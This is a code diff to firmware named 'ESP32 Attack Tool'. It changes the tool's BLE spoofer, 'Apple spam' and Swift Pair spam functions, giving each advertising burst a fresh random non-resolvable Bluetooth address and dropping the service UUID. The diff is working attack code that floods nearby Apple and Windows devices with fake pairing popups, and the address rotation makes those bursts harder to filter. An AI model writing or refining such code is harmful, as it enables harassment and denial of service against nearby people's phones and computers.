@@ -182,7 +182,7 @@ void BLEModules::initSpoofer() {
         Serial.println("[INFO] BLE already initialized, skipping...");
         return;
     }
-    NimBLEDevice::init("ESP32 Attack Tool - BLE Spoofer");
+    NimBLEDevice::init("ESP32 Attack Tool");
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
@@ -278,8 +278,8 @@ void BLEModules::initSpam() {
     //NimBLEServer *pServer = NimBLEDevice::createServer();
     //pAdvertising = pServer->getAdvertising();
 
-    //esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    //esp_ble_gap_set_rand_addr(null_addr);
+    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    esp_ble_gap_set_rand_addr(null_addr);
 
     ble_initialized = true;
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
@@ -288,9 +288,12 @@ void BLEModules::initSpam() {
 
 void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
 {
-    uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
+    esp_bd_addr_t dummy_addr = {0x00};
+    for (int i = 0; i < 6; i++) {
+      dummy_addr[i] = random(256);
+      if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
+    }
+    esp_ble_gap_set_rand_addr(dummy_addr);
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
@@ -303,7 +306,7 @@ void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
     pAdvertising->start();
     vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    NimBLEDevice::deinit();
+    //NimBLEDevice::deinit();
 }
 
 void BLEModules::executeSwiftpair(EBLEPayloadType type)
@@ -311,11 +314,17 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
+    esp_bd_addr_t dummy_addr = {0x00};
+    for (int i = 0; i < 6; i++) {
+      dummy_addr[i] = random(256);
+      if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
+    }
+    esp_ble_gap_set_rand_addr(dummy_addr);
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
-    pAdvertising->addServiceUUID(SERVICE_UUID);
+    //pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     vTaskDelay(10 / portTICK_PERIOD_MS);
